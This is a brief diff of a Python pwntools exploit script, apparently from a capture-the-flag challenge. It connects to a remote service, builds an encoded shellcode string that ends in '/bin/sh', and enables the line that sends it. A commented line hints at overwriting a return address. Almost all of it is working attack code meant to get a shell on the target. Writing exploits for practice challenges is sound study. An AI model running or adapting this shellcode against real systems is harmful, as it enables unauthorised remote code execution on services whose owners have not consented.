@@ -9,11 +9,11 @@ y = remote( host , port )
 
 name = 0x6010a0
 
-sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh\x00' 
+sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh' 
 
 print len( sc )
 
-#y.sendafter( ']:' , sc )
+y.sendafter( ']:' , sc )
 
 #y.send( 'D' * 0x18 + p64( name ) )
 
